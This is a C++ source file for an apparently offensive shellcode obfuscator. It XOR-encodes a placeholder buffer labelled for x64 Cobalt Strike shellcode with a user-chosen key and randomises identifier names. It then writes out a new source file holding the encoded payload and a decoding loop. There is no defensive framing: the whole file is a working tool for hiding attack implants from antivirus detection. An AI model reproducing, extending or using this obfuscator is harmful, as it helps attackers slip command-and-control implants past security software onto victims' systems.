#include "Windows.h"
#include "iostream"
#include <fstream>
#include <string>
#include <time.h>
#include <stdlib.h>


using namespace std;


string randString(int size){
	string a;
	for(int i = 0; i < size; i++)
	{
		int asc_value = rand() % 122 + 65;
		if( (asc_value <= 90 && asc_value >= 65)  || (asc_value >= 97 && asc_value <= 122))
		a +=  (char)asc_value;
		else
		i--;
		
	}
return a;	
}




void obfuscate(string fName, string aName, unsigned char *shelly, int s_c, string key, string kName){
	ofstream cout("obfuscated-shellcode.cpp");
	unsigned char encodedShelly[s_c];
	cout << "std::string "<<kName <<"="<<"\"" << key << "\"" <<";" << endl << endl; 
	cout << "char "<<aName <<"[]" <<" = " << "\"";
	
	int j =0;
	for(int i = 0; i < s_c; i++)
	{
		if(j >= key.size() -1)
			j=0;
		encodedShelly[i] = shelly[i] ^ key[j];
		j++;
	}
	for(int i = 0; i < s_c; i++)
	{
		cout <<"\\x"<< hex << (int)encodedShelly[i];
	}
	cout << "\";";
	
	cout << endl << endl << endl;
	cout << "int j = 0;" << endl;
	cout << "for(int i=0; i < sizeof " << aName << "; i++){" << endl;
	cout << "if(j == "<< kName << ".size()" <<" -1) j=0;" << endl;
	cout << aName << "[" << "i" << "]" << " = " << aName << "[" << "i" << "]" << "^" << kName <<"[j]" << ";" << endl;
	cout <<"j++;";
	cout << "}";	
}




int main()
{
	unsigned seed = time(0);
	srand(seed);

	int funcNameSize = rand() % 15 + 5;
	string funcName = randString(funcNameSize);

	int arrNameSize = rand() % 13+7;
	string arrName = randString(arrNameSize);

	int keyNameSize = rand() % 19+7;
	string keyName = randString(keyNameSize);

	int ptrNameSize = rand() % 25+5;
	string ptrName = randString(ptrNameSize);

	cout << "Encoding Key= ";
	string encodeKey;
	cin >> encodeKey;

	unsigned char buf[] = "<YOUR X64 COBALT STRIKE SHELLCODE HERE>";

	obfuscate(funcName, arrName, buf, sizeof buf, encodeKey, keyName);

}